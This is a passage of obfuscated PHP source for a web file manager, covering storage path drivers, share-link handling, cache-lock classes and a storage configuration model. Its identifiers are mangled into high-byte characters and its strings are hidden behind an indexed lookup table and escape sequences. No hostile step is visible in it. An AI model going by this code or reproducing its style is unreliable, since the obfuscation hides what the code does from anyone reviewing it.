$this->model->rename($ºüéê˜¶, $ŸæÖ ); return $Šû¬Ó•ê ? $this->getPathOuter($ºüéê˜¶) : $Šû¬Ó•ê; } public function size($Ğœ›¾’Ô) { $Äá½€¶ş = $this->infoSimple($Ğœ›¾’Ô); return $Äá½€¶ş ? $Äá½€¶ş[$_SERVER[­á Ş³Ö][76]] : 0; } public function infoSimple($éÎÎã) { return $this->model->sourceInfo($éÎÎã); } public function info($óáÎ¼ï´) { return $this->infoParse($óáÎ¼ï´); } public function infoAuth($è–Û‚²Ğ) { return $this->infoParse($è–Û‚²Ğ, !1, !0); } public function infoWithChildren($­à—®í¸) { return $this->infoParse($­à—®í¸, !0); } protected function infoParse($‹í³—²ù, $¹‘ê‡ò³ = false, $Î” Ó¬ = false) { if (!$¹‘ê‡ò³) { return $this->model->pathInfo($‹í³—²ù, $Î” Ó¬); } return $this->model->pathInfoMore($‹í³—²ù); } public function infoFull($ªÁ·ã–Í) { $ÇàÊ•Å‹ =& $_SERVER[­á Ş³Ö]; $–‘Ù±Ä = explode($ÇàÊ•Å‹[8], $ªÁ·ã–Í); $ûäığôÖ = implode($ÇàÊ•Å‹[8], array_splice($–‘Ù±Ä, 1)); return $this->model->pathInfoByPath($–‘Ù±Ä[0], $ûäığôÖ); } public function hashSimple($š¶ÑÛû‹) { $Ç™åÜÔ³ =& $_SERVER[­á Ş³Ö]; $æÀŒ§¯‹ = $this->infoWithChildren($š¶ÑÛû‹); return $æÀŒ§¯‹[$Ç™åÜÔ³[170]][$Ç™åÜÔ³[177]]; } public function hashMd5($ˆœ¼¥å) { $‰ìËöÃ =& $_SERVER[­á Ş³Ö]; $éĞÉº¾Í = $this->infoWithChildren($ˆœ¼¥å); return $éĞÉº¾Í[$‰ìËöÃ[170]][$‰ìËöÃ[176]]; } public function exist($«„êàÒ“) { $Èæ¼—ó³ =& $_SERVER[­á Ş³Ö]; $Úİ³‚„¯ = $this->parse($«„êàÒ“); if (!$Úİ³‚„¯[$Èæ¼—ó³[84]]) { return $this->isFile($«„êàÒ“) || $this->isFolder($«„êàÒ“); } $œ©Å£íë = array($Èæ¼—ó³[401] => $Úİ³‚„¯[$Èæ¼—ó³[399]], $Èæ¼—ó³[32] => $Úİ³‚„¯[$Èæ¼—ó³[84]]); $œİâÑç = $this->model->where($œ©Å£íë)->find(); return $œİâÑç ? !0 : !1; } public function isFile($ÁÎŠé„ß) { $¸ìÙ±—Ò =& $_SERVER[­á Ş³Ö]; $‘‡êı¾ö = $this->infoSimple($ÁÎŠé„ß); return $‘‡êı¾ö && $‘‡êı¾ö[$¸ìÙ±—Ò[410]] == $¸ìÙ±—Ò[88] ? !1 : !0; } public function isFolder($ìˆ‘¿¬) { $ñÊùË =& $_SERVER[­á Ş³Ö]; $™Ïé¸ÙŒ = $this->infoSimple($ìˆ‘¿¬); return $™Ïé¸ÙŒ && $™Ïé¸ÙŒ[$ñÊùË[410]] == $ñÊùË[88] ? !0 : !1; } public function listPath($‚¹˜ğ, $Æé ä = false) { $ğÅ¶üêÊ =& $_SERVER[­á Ş³Ö]; if ($‚¹˜ğ == $ğÅ¶üêÊ[12]) { return !1; } $¦ë ‹»¿ = array($ğÅ¶üêÊ[401] => $‚¹˜ğ); if ($Æé ä) { return $this->model->listSource($¦ë ‹»¿, -1); } return $this->model->listSource($¦ë ‹»¿); } public function has($ßè®…¦Š, $§“›˜­Ÿ = false, $ñ«–ùü€ = null) { $ÀºÌæÒ« =& $_SERVER[­á Ş³Ö]; $ã×”Æ¼Ğ = $this->infoWithChildren($ßè®…¦Š); if ($§“›˜­Ÿ) { return array($ÀºÌæÒ«[208] => $ã×”Æ¼Ğ[$ÀºÌæÒ«[208]], $ÀºÌæÒ«[207] => $ã×”Æ¼Ğ[$ÀºÌæÒ«[207]]); } return $ñ«–ùü€ ? $ã×”Æ¼Ğ[$ÀºÌæÒ«[208]] : $ã×”Æ¼Ğ[$ÀºÌæÒ«[207]]; } public function listAll($ßÕš©õ×) { $ªç§øÈË = IO::info($this->pathParse[$_SERVER[­á Ş³Ö][84]]); if (!$ªç§øÈË) { return array(); } return $this->model->listAll($ßÕš©õ×); } public function getContent($´œ‘ƒ¿) { return $this->model->getContent($´œ‘ƒ¿); } public function setContent($£÷ïÉ¢, $‚…‘‘ˆ = '') { return $this->model->setContent($£÷ïÉ¢, $‚…‘‘ˆ); } public function fileSubstr($ËòÍ¡¯¯, $ÏÚöã‰¤, $äš ·öç) { return $this->model->fileSubstr($ËòÍ¡¯¯, $ÏÚöã‰¤, $äš ·öç); } public function download($Ü¸®íäğ, $ ¿Ô·Êü = '') { $õõ¯‡Ï· = get_path_father($ ¿Ô·Êü); $™×ÒÊğ = get_path_this($ ¿Ô·Êü); $ËîÕèÄ† = $this->model->fileInfoGet($Ü¸®íäğ); $à‰†¶…¹ = IO::copy($ËîÕèÄ†[$_SERVER[­á Ş³Ö][84]], $õõ¯‡Ï·, !1, $™×ÒÊğ); return $à‰†¶…¹; } public function setModifyTime($Û¨Ñü×¥, $ô—ªòÔ‰ = '') { $ÍÂ»Ö©Ğ =& $_SERVER[­á Ş³Ö]; if (!$Û¨Ñü×¥) { return; } $this->model->where(array($ÍÂ»Ö©Ğ[417] => $Û¨Ñü×¥))->save(array($ÍÂ»Ö©Ğ[85] => $ô—ªòÔ‰)); } public function upload($öÎ»–úà, $Ò„÷ªÈ›, $ÛÃˆİÕ¤ = false, $¦Ê´ÁĞÒ = REPEAT_REPLACE) { $å çæáı =& $_SERVER[­á Ş³Ö]; $‹¦Ç„§ß = $this->parse($öÎ»–úà); $äĞ×ÜÎı = $this->model->addFile($‹¦Ç„§ß[$å çæáı[399]], $Ò„÷ªÈ›, $‹¦Ç„§ß[$å çæáı[84]], $ÛÃˆİÕ¤, $¦Ê´ÁĞÒ); return $this->getPathOuter($äĞ×ÜÎı); } public function uploadFileByID($±œú§Ìà, $¨×£‰†, $ˆ’¹é«ù) { $ÊîÒÜƒ =& $_SERVER[­á Ş³Ö]; $é•½‹¦ = $this->parse($±œú§Ìà); $Ãô´»± = $this->model->addFileByFileID($é•½‹¦[$ÊîÒÜƒ[399]], $¨×£‰†, $é•½‹¦[$ÊîÒÜƒ[84]], $ˆ’¹é«ù); return $this->getPathOuter($Ãô´»±); } public function addFileByRemote($ï­¸ú’€, $§«ë¦ñê, $ê×±éÓË = array(), $Ùæ×ÉŞ­ = '', $ëÜ¸€ş) { $±Áò©ùü =& $_SERVER[­á Ş³Ö]; $®ö½ë˜ = $this->parse($ï­¸ú’€); $Ùæ×ÉŞ­ = empty($Ùæ×ÉŞ­) ? $®ö½ë˜[$±Áò©ùü[84]] : $Ùæ×ÉŞ­; $ŠÊ·Á© = $this->model->addFileByRemote($®ö½ë˜[$±Áò©ùü[399]], $§«ë¦ñê, $Ùæ×ÉŞ­, $ê×±éÓË, $ëÜ¸€ş); return $this->getPathOuter($ŠÊ·Á©); } public function uploadLink($—æ¯Ÿ¼£, $ĞÎ¾¾¡ƒ = 0) { $êõÅ É” =& $_SERVER[­á Ş³Ö]; $«·‚°Æ‰ = $this->parse($—æ¯Ÿ¼£); $©½’€†Ñ = _get($GLOBALS[$êõÅ É”[7]], $êõÅ É”[1337]); $õÍ÷¼–€ = _get($GLOBALS[$êõÅ É”[7]], $êõÅ É”[1338]); $—æ¯Ÿ¼£ = Model($êõÅ É”[601])->createFileName($«·‚°Æ‰[$êõÅ É”[84]], $©½’€†Ñ, $õÍ÷¼–€); return IO::uploadLink($—æ¯Ÿ¼£, $ĞÎ¾¾¡ƒ); } public function fileNameAuto($¥ÃŸÚ“ğ, $„‚¾Õø±, $ÒÊ‚´Ùõ = REPEAT_REPLACE, $»¢²™ëØ = false) { return $this->model->fileNameAuto($¥ÃŸÚ“ğ, $„‚¾Õø±, $ÒÊ‚´Ùõ, $»¢²™ëØ); } public function fileNameExist($Ø“øşÉê, $ßìÎš¡) { return $this->model->fileNameExist($Ø“øşÉê, $ßìÎš¡); } protected function _fileOut($Ó¦º¸‰, $ÂªĞ¬ÊÒ = false, $€Èºà«ù = false, $à›Ñú´ = '', $ÄÍ¿ÈÄ = false) { $»ÃÎë›ù =& $_SERVER[­á Ş³Ö]; $§ãÔ«© = $this->model->sourceInfo($Ó¦º¸‰); if ($§ãÔ«©[$»ÃÎë›ù[410]] == $»ÃÎë›ù[88]) { header($»ÃÎë›ù[1339]); die; } $ôÛ´õ÷µ = $this->model->fileInfoGet($Ó¦º¸‰); $à›Ñú´ = $ôÛ´õ÷µ[$»ÃÎë›ù[176]] ? $ôÛ´õ÷µ[$»ÃÎë›ù[176]] : $à›Ñú´; $™¡¦¶¡ = isset($GLOBALS[$»ÃÎë›ù[1340]]) ? $GLOBALS[$»ÃÎë›ù[1340]] : $§ãÔ«©[$»ÃÎë›ù[32]]; if ($ÄÍ¿ÈÄ) { return IO::fileOutServer($ôÛ´õ÷µ[$»ÃÎë›ù[84]], $ÂªĞ¬ÊÒ, $™¡¦¶¡, $à›Ñú´); } IO::fileOut($ôÛ´õ÷µ[$»ÃÎë›ù[84]], $ÂªĞ¬ÊÒ, $™¡¦¶¡, $à›Ñú´); } public function fileOut($°¼ƒ¹¢Ó, $ÇšÓïÒ = false, $­ç§ÛÉ’ = false, $š½À´…½ = '') { $this->_fileOut($°¼ƒ¹¢Ó, $ÇšÓïÒ, $­ç§ÛÉ’, $š½À´…½); } public function fileOutServer($ØŠÆ—Ã…, $ÇÉ¼À° = false, $à—Êòş– = false, $Å„²•½™ = '') { $this->_fileOut($ØŠÆ—Ã…, $ÇÉ¼À°, $à—Êòş–, $Å„²•½™, !0); } protected function _fileOutImage($Ä›¡«‘, $—Ï°‘·Õ = 250) { $ò±Ã“Ÿµ =& $_SERVER[­á Ş³Ö]; $Ñµ•§ñ÷ = $this->model->pathInfo($Ä›¡«‘); if ($Ñµ•§ñ÷[$ò±Ã“Ÿµ[410]] == $ò±Ã“Ÿµ[88]) { show_json($ò±Ã“Ÿµ[1341] . $Ä›¡«‘, !1); } $ º÷Öãê = $this->model->fileInfoGet($Ä›¡«‘); $ º÷Öãê[$ò±Ã“Ÿµ[32]] = $Ñµ•§ñ÷[$ò±Ã“Ÿµ[32]]; $ º÷Öãê[$ò±Ã“Ÿµ[169]] = $Ñµ•§ñ÷[$ò±Ã“Ÿµ[169]]; $GLOBALS[$ò±Ã“Ÿµ[1340]] = $ º÷Öãê[$ò±Ã“Ÿµ[32]]; $GLOBALS[$ò±Ã“Ÿµ[168]] = $ º÷Öãê; IO::fileOutImage($ º÷Öãê[$ò±Ã“Ÿµ[84]], $—Ï°‘·Õ); } public function fileOutImage($“ë€³óÚ, $™”è¾©» = 250) { $this->_fileOutImage($“ë€³óÚ, $™”è¾©»); } public function fileOutImageServer($ƒ´¹ÒôÃ, $¸äÃğÚÓ = 250) { $this->_fileOutImage($ƒ´¹ÒôÃ, $¸äÃğÚÓ); } public function link($ËøæŠ©, $Â“òâû” = '') { $‹­Û‹õµ = $this->model->fileInfoGet($ËøæŠ©); return IO::link($‹­Û‹õµ[$_SERVER[­á Ş³Ö][84]], $Â“òâû”); } protected function parse($‡Ü¸Ÿ˜Ã) { $ãÂæ³ä° =& $_SERVER[­á Ş³Ö]; if (strstr($‡Ü¸Ÿ˜Ã, $ãÂæ³ä°[8]) === !1) { return array($ãÂæ³ä°[419] => intval($‡Ü¸Ÿ˜Ã), $ãÂæ³ä°[84] => $ãÂæ³ä°[12], $ãÂæ³ä°[1336] => array()); } $åÙÕÓå¦ = explode($ãÂæ³ä°[8], trim($‡Ü¸Ÿ˜Ã, $ãÂæ³ä°[8])); if (count($åÙÕÓå¦) < 2) { show_tips(clear_html($‡Ü¸Ÿ˜Ã) . $ãÂæ³ä°[1342]); } return array($ãÂæ³ä°[419] => intval($åÙÕÓå¦[0]), $ãÂæ³ä°[84] => $åÙÕÓå¦[1], $ãÂæ³ä°[1336] => array_slice($åÙÕÓå¦, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($‡­°®ƒï) { $this->pathParse = $‡­°®ƒï; $this->model = Model($_SERVER[­á Ş³Ö][1335]); } public function getPathOuter($•òúˆ°¶) { $óı•ÈÍŠ =& $_SERVER[­á Ş³Ö]; if (!$•òúˆ°¶) { return $•òúˆ°¶; } $Ì”ÜÓŒ¥ = $this->parse($•òúˆ°¶); return trim(KodIO::makeShare($this->pathParse[$óı•ÈÍŠ[399]], $Ì”ÜÓŒ¥[$óı•ÈÍŠ[399]]), $óı•ÈÍŠ[8]); } protected function infoParse($Óï‹¢é‰, $¨§ø¸Ê” = false, $úíê‹š‹ = false) { $ÅãÎ‚Ù =& $_SERVER[­á Ş³Ö]; $Ëï¨—éª = $this->pathParse[$ÅãÎ‚Ù[399]]; $†éø­¢’ = trim($this->pathParse[$ÅãÎ‚Ù[1164]], $ÅãÎ‚Ù[8]); return Action($ÅãÎ‚Ù[1343])->sharePathInfo($Ëï¨—éª, $†éø­¢’, $¨§ø¸Ê”); } public function infoFull($î€¢ñ¨) { $Ç†ÅÓÂ± =& $_SERVER[­á Ş³Ö]; $§²İ«õ = explode($Ç†ÅÓÂ±[8], trim($î€¢ñ¨, $Ç†ÅÓÂ±[8])); if (count($§²İ«õ) > 1) { $üì¿‚¸ = implode($Ç†ÅÓÂ±[8], array_splice($§²İ«õ, 1)); $ñ¥ç¢´ = $this->model->pathInfoByPath($§²İ«õ[0], $üì¿‚¸); if (!$ñ¥ç¢´) { return !1; } $this->pathParse[$Ç†ÅÓÂ±[1164]] = $ñ¥ç¢´[$Ç†ÅÓÂ±[402]]; } return $this->infoParse($î€¢ñ¨); } public function listAll($Ù—¬­™Š) { $…éŠÖÈş =& $_SERVER[­á Ş³Ö]; $–õØ†ì = IO::info($this->pathParse[$…éŠÖÈş[84]]); if (!$–õØ†ì) { return array(); } $Â•Ñ¹ß¹ = $this->model->listAll($Ù—¬­™Š); $©â´¡ôù = Model($…éŠÖÈş[592])->getInfo($–õØ†ì[$…éŠÖÈş[593]]); foreach ($Â•Ñ¹ß¹ as &$Œ“æ¶ÍÏ) { check_abort(); $Œ“æ¶ÍÏ[$…éŠÖÈş[87]] = Action($…éŠÖÈş[1343])->_shareItemeParse($Œ“æ¶ÍÏ[$…éŠÖÈş[87]], $©â´¡ôù); } unset($Œ“æ¶ÍÏ); return $Â•Ñ¹ß¹; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($Ò¯ïÅşŠ) { $this->pathParse = $Ò¯ïÅşŠ; $this->model = Model($_SERVER[­á Ş³Ö][1335]); } protected function infoParse($Ï‡°Í¦ó, $–¡ ‹¤  = false, $ŸÌÀ£À¦ = false) { $İáŠìå¬ =& $_SERVER[­á Ş³Ö]; return Action($İáŠìå¬[1170])->sharePathInfo($this->pathParse[$İáŠìå¬[84]], !0, $–¡ ‹¤ ); } public function listPath($ÊŸ¥ò¼, $ñûÖ›Š = false) { $ÊÏÓ˜˜ =& $_SERVER[­á Ş³Ö]; $Ğ•®ïš = parent::listPath($ÊŸ¥ò¼, $ñûÖ›Š); if (!$Ğ•®ïš) { return $Ğ•®ïš; } if (is_array($Ğ•®ïš[$ÊÏÓ˜˜[1344]])) { $Ğ•®ïš[$ÊÏÓ˜˜[1344]] = Action($ÊÏÓ˜˜[1170])->shareItemInfo($Ğ•®ïš[$ÊÏÓ˜˜[1344]]); } foreach ($Ğ•®ïš as $ğ«¡ïöâ => $½È­¸†¥) { if (!in_array($ğ«¡ïöâ, array($ÊÏÓ˜˜[83], $ÊÏÓ˜˜[82]))) { continue; } foreach ($½È­¸†¥ as $Ïı…å¦¢ => $œõª¨´‘) { $Ğ•®ïš[$ğ«¡ïöâ][$Ïı…å¦¢] = Action($ÊÏÓ˜˜[1170])->shareItemInfo($œõª¨´‘); } } return $Ğ•®ïš; } public function listAll($¬éóñˆÙ) { $ïœñ½ìÔ =& $_SERVER[­á Ş³Ö]; $ÔÁÄÂÌƒ = IO::info($this->pathParse[$ïœñ½ìÔ[84]]); if (!$ÔÁÄÂÌƒ) { return array(); } $àÊØ”• = $this->model->listAll($¬éóñˆÙ); foreach ($àÊØ”• as &$™§©É¡õ) { $™§©É¡õ[$ïœñ½ìÔ[87]] = Action($ïœñ½ìÔ[1170])->shareItemInfo($™§©É¡õ[$ïœñ½ìÔ[87]]); } unset($™§©É¡õ); return $àÊØ”•; } } goto b…¨–‹´İ‰; B«Ô†Çç›·: class CacheLockRedis { public function lock($˜ø•™œ, $ Ùôùşú = 10) { $Ş¹×¹Â¼ = Cache::init(); $îô§Ãü = microtime(!0) + $ Ùôùşú; while (microtime(!0) < $îô§Ãü) { $‚ªã‘³õ = $Ş¹×¹Â¼->get($˜ø•™œ); if (!$‚ªã‘³õ) { $áÚ°¦É‚ = $Ş¹×¹Â¼->setLock($˜ø•™œ, $îô§Ãü, $ Ùôùşú); if ($áÚ°¦É‚) { return !0; } } else { if ($‚ªã‘³õ < microtime(!0)) { $Ş¹×¹Â¼->set($˜ø•™œ, $îô§Ãü, $ Ùôùşú * 2); if ($Ş¹×¹Â¼->get($˜ø•™œ) === $‚ªã‘³õ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($“·±É¯Š) { return Cache::init()->get($“·±É¯Š); } public function unlock($ãş¹ª¾†) { return Cache::init()->remove($ãş¹ª¾†); } } class CacheLockMemcached { public function lock($è­¼Ÿ„¥, $«©ß¡İİ = 0) { $„¬‚éÃö = Cache::init(); $ÄãÔÖƒù = microtime(!0) + $«©ß¡İİ; while (microtime(!0) < $ÄãÔÖƒù) { $¤àœöÌš = $„¬‚éÃö->get($è­¼Ÿ„¥); if (!$¤àœöÌš || $¤àœöÌš < microtime(!0)) { $¨æèœ¤ = $„¬‚éÃö->handle->add($è­¼Ÿ„¥, $ÄãÔÖƒù, $«©ß¡İİ); if ($¨æèœ¤) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($™åö¬ãˆ) { return Cache::init()->get($™åö¬ãˆ); } public function unlock($¡¯•»şÎ) { return Cache::init()->remove($¡¯•»şÎ); } } class CacheLockDatabase { public function lock($Œ»Å©, $Ëˆ«…·ì = 0) { $Ş´”Ò»® = Model($_SERVER[­á Ş³Ö][826]); $îšğ×ßÊ = microtime(!0) + $Ëˆ«…·ì; while (microtime(!0) < $îšğ×ßÊ) { $Ï…å¸–ã = $Ş´”Ò»®->get($Œ»Å©); if (!$Ï…å¸–ã || $Ï…å¸–ã < microtime(!0)) { $Õâ‘†«ş = $Ş´”Ò»®->set($Œ»Å©, $îšğ×ßÊ); if ($Õâ‘†«ş) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($•¯ªÜâ¨) { return Model($_SERVER[­á Ş³Ö][826])->get($•¯ªÜâ¨); } public function unlock($³ßçŒÅâ) { Model($_SERVER[­á Ş³Ö][826])->remove($³ßçŒÅâ); } } goto fĞÉ•íäñÆ; c‘æÊ©©: class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\56\163\x74\x6f\162\x61\147\145\x4c\x69\163\164"; public $field = array("\x6e\141\155\x65", "\x73\x69\x7a\x65\x4d\141\170", "\163\x79\x73\x74\x65\155", "\x64\x65\146\141\165\x6c\164", "\144\162\151\166\145\162", "\143\157\x6e\x66\x69\147"); public function listData($Üµß‰úÜ = false, $È–‹—Øğ = "\155\x6f\x64\151\x66\x79\124\151\155\145", $•£ıÙì¤ = false) { $ë‹§Èå =& $_SERVER[­á Ş³Ö]; $ø’±ÍÚ€ = parent::listData($Üµß‰úÜ, $È–‹—Øğ, $•£ıÙì¤); if ($Üµß‰úÜ) { return $ø’±ÍÚ€; } $ÆïğÉ† = $this->ioSizeUseGet(array_to_keyvalue($ø’±ÍÚ€, $ë‹§Èå[12], $ë‹§Èå[399])); foreach ($ø’±ÍÚ€ as $ØÉ÷œÀú => $¹ò­ß›Õ) { unset($ø’±ÍÚ€[$ØÉ÷œÀú][$ë‹§Èå[6]]); $ø’±ÍÚ€[$ØÉ÷œÀú][$ë‹§Èå[1841]] = isset($ÆïğÉ†[$¹ò­ß›Õ[$ë‹§Èå[399]]]) ? $ÆïğÉ†[$¹ò­ß›Õ[$ë‹§Èå[399]]] : 0; } return $ø’±ÍÚ€; } public function ioSizeUseGet($²““Ü€) { $Çª’í‚ =& $_SERVER[­á Ş³Ö]; if (!$²““Ü€) { return array(); } $º…‚ÏµÏ = $Çª’í‚[2169] . implode($Çª’í‚[50], $²““Ü€); $äÒœ°ç³ = Cache::get($º…‚ÏµÏ); if ($äÒœ°ç³) { return $äÒœ°ç³; } $œÜÔê¼¨ = array($Çª’í‚[814] => $Çª’í‚[399], $Çª’í‚[2170] => $Çª’í‚[76]); $şáñõ÷Â = array($Çª’í‚[814] => array($Çª’í‚[7], $²““Ü€)); $äÒœ°ç³ = Model($Çª’í‚[786])->field($œÜÔê¼¨)->where($şáñõ÷Â)->group($Çª’í‚[814])->select(); $äÒœ°ç³ = array_to_keyvalue($äÒœ°ç³, $Çª’í‚[399], $Çª’í‚[76]); Cache::set($º…‚ÏµÏ, $äÒœ°ç³, 600); return $äÒœ°ç³; } public function getConfig($›Óçå…•) { $–˜î’ÊÃ = parent::listData($›Óçå…•); return json_decode($–˜î’ÊÃ[$_SERVER[­á Ş³Ö][6]], !0); } public function update($ëçûœİ, $ØÔÊğâï) { $ËšöÍ’ =& $_SERVER[­á Ş³Ö]; $«¼¥”¸ş = $ØÔÊğâï[$ËšöÍ’[32]]; $¶²¹ûûŒ = array_to_keyvalue(parent::listData(), $ËšöÍ’[32]); if (isset($¶²¹ûûŒ[$«¼¥”¸ş]) && $¶²¹ûûŒ[$«¼¥”¸ş][$ËšöÍ’[399]] != $ëçûœİ) { return !1; } $this->checkPwd($ëçûœİ, $ØÔÊğâï); if (isset($ØÔÊğâï[$ËšöÍ’[2171]]) && $ØÔÊğâï[$ËšöÍ’[2171]] == $ËšöÍ’[88]) { $this->checkConfig($ØÔÊğâï); } unset($ØÔÊğâï[$ËšöÍ’[2171]]); $¡Û¥ÍÚî = parent::update($ëçûœİ, $ØÔÊğâï); if ($¡Û¥ÍÚî && $ØÔÊğâï[$ËšöÍ’[37]]) { $ø¯ë³©¡ = 0; foreach ($¶²¹ûûŒ as $İ–ïà„) { if ($İ–ïà„[$ËšöÍ’[37]] && $İ–ïà„[$ËšöÍ’[399]] != $ëçûœİ) { $ø¯ë³©¡ = $İ–ïà„[$ËšöÍ’[399]]; parent::update($İ–ïà„[$ËšöÍ’[399]], array($ËšöÍ’[37] => 0)); } } $this->updateBackup($ëçûœİ, $ø¯ë³©¡); } return $¡Û¥ÍÚî; } public function add($¦İòê¡×) { $¿¡…ËÕ =& $_SERVER[­á Ş³Ö]; $Èã¢Ï = array_to_keyvalue(parent::listData(), $¿¡…ËÕ[32]); if (isset($Èã¢Ï[$¦İòê¡×[$¿¡…ËÕ[32]]])) { return !1; } $this->checkConfig($¦İòê¡×); $¦°‰ññå = parent::insert($¦İòê¡×); if ($¦°‰ññå && $¦İòê¡×[$¿¡…ËÕ[37]]) { foreach ($Èã¢Ï as $É¡åÃºæ) { if ($É¡åÃºæ[$¿¡…ËÕ[37]]) { parent::update($É¡åÃºæ[$¿¡…ËÕ[399]], array($¿¡…ËÕ[37] => 0)); } } } return $¦°‰ññå; } public function updateBackup($ä¹†ØøÒ, $ò•Š¢§±) { $½Üğ—„è =& $_SERVER[­á Ş³Ö]; if (!$ò•Š¢§±) { return; } $‡‘¢á®ì = Model($½Üğ—„è[745])->config(); if ($‡‘¢á®ì[$½Üğ—„è[1633]] != $½Üğ—„è[88] || $‡‘¢á®ì[$½Üğ—„è[748]] != $ò•Š¢§±) { return; } $¡‡ä²Ù« = Model($½Üğ—„è[767])->get($½Üğ—„è[777]); $¡‡ä²Ù« = json_decode($¡‡ä²Ù«, !0); if (!$¡‡ä²Ù«) { return; } $¡‡ä²Ù«[$½Üğ—„è[748]] = $ä¹†ØøÒ; Model($½Üğ—„è[767])->set(array($½Üğ—„è[777] => $¡‡ä²Ù«)); } public function checkPwd($µßƒÈì´, &$ºÍ ˆÂ•) { $‡¾¨ˆ =& $_SERVER[­á Ş³Ö]; if (empty($ºÍ ˆÂ•[$‡¾¨ˆ[6]])) { return; } $¢Ôš¦·» = json_decode($ºÍ ˆÂ•[$‡¾¨ˆ[6]], !0); $™‚´š§Š = $‡¾¨ˆ[12]; $¡şòÒ­ê = array($‡¾¨ˆ[2172], $‡¾¨ˆ[2173], $‡¾¨ˆ[885]); foreach ($¡şòÒ­ê as $ôÍÃİš¨) { if (isset($¢Ôš¦·»[$ôÍÃİš¨])) { $™‚´š§Š = $ôÍÃİš¨; break; } } if (!$™‚´š§Š) { return; } $Ó¥èåÔÊ = $this->getConfig($µßƒÈì´); $—É›ì÷¥ = $Ó¥èåÔÊ[$™‚´š§Š]; $¦äàœåä = $¢Ôš¦·»[$™‚´š§Š]; if ($¦äàœåä == str_repeat($‡¾¨ˆ[189], strlen($—É›ì÷¥))) { $¢Ôš¦·»[$™‚´š§Š] = $—É›ì÷¥; $ºÍ ˆÂ•[$‡¾¨ˆ[6]] = json_encode($¢Ôš¦·»); } else { if ($¦äàœåä != $—É›ì÷¥) { $ºÍ ˆÂ•[$‡¾¨ˆ[2171]] = $‡¾¨ˆ[88]; } } } public function checkConfig(&$åÏçÎÊı, $Á—Íî‡ä = false) { $²Ù¸É° =& $_SERVER[­á Ş³Ö]; $¨¢Ééú = strtolower($åÏçÎÊı[$²Ù¸É°[95]]); $ ü¸¶Œ• = json_decode($åÏçÎÊı[$²Ù¸É°[6]], !0); foreach ($ ü¸¶Œ• as $¶²©³İ => $ë³çşçÛ) { $ ü¸¶Œ•[$¶²©³İ] = trim($ë³çşçÛ); } $ ü¸¶Œ•[$²Ù¸É°[2174]] = rand_string(6); $ßÇÛü¿ç = $GLOBALS[$²Ù¸É°[6]][$²Ù¸É°[89]][$²Ù¸É°[823]]; $¡”¸¸âÏ = isset($ßÇÛü¿ç[$¨¢Ééú]) ? $ßÇÛü¿ç[$¨¢Ééú] : ucfirst($¨¢Ééú); $ı¼÷íÓı = $²Ù¸É°[74] . $¡”¸¸âÏ; if (!$¡”¸¸âÏ || !class_exists($ı¼÷íÓı)) { if ($Á—Íî‡ä) { return LNG($²Ù¸É°[2175]); } write_log(array($²Ù¸É°[2176], $åÏçÎÊı, get_caller_info()), $²Ù¸É°[2177]); show_json(LNG($²Ù¸É°[2175]), !1, $åÏçÎÊı); } $öšµ˜ô” = new $ı¼÷íÓı($ ü¸¶Œ•); if (in_array($¨¢Ééú, $öšµ˜ô”->objectDriver)) { if (!$öšµ˜ô”->isBucketCors() && !$öšµ˜ô”->setBucketCors()) { $´ôüıçú = LNG($²Ù¸É°[2178]); $´ôüıçú .= $²Ù¸É°[2179] . LNG($²Ù¸É°[2180]); if ($Á—Íî‡ä) { return $´ôüıçú; } show_json($´ôüıçú, !1); } } $›ÍÀé¼Ğ = rtrim($ ü¸¶Œ•[$²Ù¸É°[1176]], $²Ù¸É°[8]) . $²Ù¸É°[8]; $ä¾² ‹œ = $öšµ˜ô”->getPath($›ÍÀé¼Ğ . $²Ù¸É°[1180]); if (!$öšµ˜ô”->mkfile($ä¾² ‹œ)) { if ($Á—Íî‡ä) { return LNG($²Ù¸É°[2178]); } show_json(LNG($²Ù¸É°[2178]), !1); } $ ü¸¶Œ•[$²Ù¸É°[1176]] = $›ÍÀé¼Ğ; $åÏçÎÊı[$²Ù¸É°[6]] = json_encode($ ü¸¶Œ•); $åÏçÎÊı[$²Ù¸É°[95]] = $¡”¸¸âÏ; return !0; } public function driverListSystem() { $ª´çÏ’Ó =& $_SERVER[­á Ş³Ö]; $î×Šë = parent::listData(); $•Ç ğıâ = array(); foreach ($î×Šë as $çÕ†çı²) { unset($çÕ†çı²[$ª´çÏ’Ó[201]], $çÕ†çı²[$ª´çÏ’Ó[85]]); $çÕ†çı²[$ª´çÏ’Ó[6]] = json_decode($çÕ†çı²[$ª´çÏ’Ó[6]], !0); $•Ç ğıâ[] = $çÕ†çı²; } return $•Ç ğıâ; } public function defaultDriver() { $È·¤Ğœ =& $_SERVER[­á Ş³Ö]; $ÇæšËğá = parent::listData(); $…°Ÿ²¡Ï = array_filter_by_field($ÇæšËğá, $È·¤Ğœ[37], 1); $…°Ÿ²¡Ï = $…°Ÿ²¡Ï[0]; if ($…°Ÿ²¡Ï) { $…°Ÿ²¡Ï[$È·¤Ğœ[6]] = json_decode($…°Ÿ²¡Ï[$È·¤Ğœ[6]], !0); } return $…°Ÿ²¡Ï; } public function driverInfo($ş÷¹Ã¼ù) { $ÂŠéû¤Ò =& $_SERVER[­á Ş³Ö]; $•ÛÑ° = array_to_keyvalue(parent::listData(), $ÂŠéû¤Ò[399]); if (!isset($•ÛÑ°[$ş÷¹Ã¼ù])) { return !1; } $¶ÓÙ»¶Ú = $•ÛÑ°[$ş÷¹Ã¼ù]; $¶ÓÙ»¶Ú[$ÂŠéû¤Ò[6]] = json_decode($¶ÓÙ»¶Ú[$ÂŠéû¤Ò[6]], !0); return $¶ÓÙ»¶Ú; } public function remove($¨Ô‹°à¯) { $this->removeShareItems($¨Ô‹°à¯); return parent::remove($¨Ô‹°à¯); } public function removeWithFile($şÅæ¡–°, $æ¥ïÆ“Æ) { $Ï‡åÑ£« =& $_SERVER[­á Ş³Ö]; $ã¸ŞşÏ¡ = array($Ï‡åÑ£«[814] => $şÅæ¡–°); $¢ßŞ„‡³ = Model($Ï‡åÑ£«[471])->where($ã¸ŞşÏ¡)->count(); $ÍÓå¾”Ö = Model($Ï‡åÑ£«[471])->where($ã¸ŞşÏ¡)->sum($Ï‡åÑ£«[76]); $†®É™áî = $æ¥ïÆ“Æ . $Ï‡åÑ£«[2181] . $şÅæ¡–°; 